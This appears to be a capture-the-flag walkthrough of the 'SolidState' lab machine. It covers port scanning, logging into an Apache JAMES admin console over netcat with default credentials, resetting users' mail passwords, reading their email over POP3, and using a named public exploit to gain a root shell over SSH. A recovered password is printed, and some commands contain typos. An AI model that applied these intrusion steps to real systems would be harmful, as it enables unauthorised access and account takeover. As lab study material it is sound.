# SolidState

### What I Learned

1. Always check running software based on the services running on the ports
2. Gaining access to user's machines using basic credentials (root,root | admin,password)

<details>
  <summary><strong>Writeup Summary</strong></summary>
Nmap scan the machine, then scan all ports on the machine. Then run a targeted scan on the found ports. Find the version of the application running on the extra port. Try to get into the extra port using netcat. Try basic credentials like admin/admin, james/password, root/root and get into the JAMES admin console. Change the user's passwords, then access the mail server on port 110 to read user's emails. Get the password for the mindy user.
Find an exploit for the Apache JAMES server and use it to upload a compromised file. SSH into the machine using mindy, which activates the exploit, granting a root shell.
</details>
<br>

## Writeup

### Take screenshots!

Scan the machine, then scan all ports

- `nmap -sC -sV -sT -vv -oA nmap/first_scan <IP_ADDR>`
- `nmap -p- -T5 -oA nmap/allports <IP_ADDR>`

Get a list of all open ports

- `grep -oP '\d{1,5}/open' allports.gnmap`
- `grep -oP '\d{1,5}/open' allports.gnmap | sort -u > ports.list`
- Open ports.list in vi, then run
  - Remove "ope" on each line
  - %s/\/ope//g
  - Remove newlines and add a comma
  - %s/n\n/,/g
  - Now you have a comma separated list of all open ports

Now run a targeted scan

- `nmap -p 11.,119,22,25,4555,80 -sC -sV -oA nmap/targeted --script vuln <IP_ADDR>`

While waiting, check the 4555 port

- `nc <IP> 4555`
- Password and username are `root`
- Can use python and expect to create a brute forcer for that - or pwntools?

Use the JAMES server CLI to reset all the user's passwords to "password"

Telnet into port 110 and run

- USER mindy
- PASS password
- LIST
- RETR 2

Get mindy's password

- `P@55W0rd1!2@`

SSH into the machine

- `ssh mindy@10.129.61.184`

`cat /etc/passwd`
Shows that mindy is running rbash (restricted), so some commands will not work

Find all commands accessible

- compgen -c
- None are in gtfobins

Download other apache james RCE exploit that uses python3, set the variables, and run it.

- `linux/remote/50347.py`

SSH into the machine as mindy to get a root shell
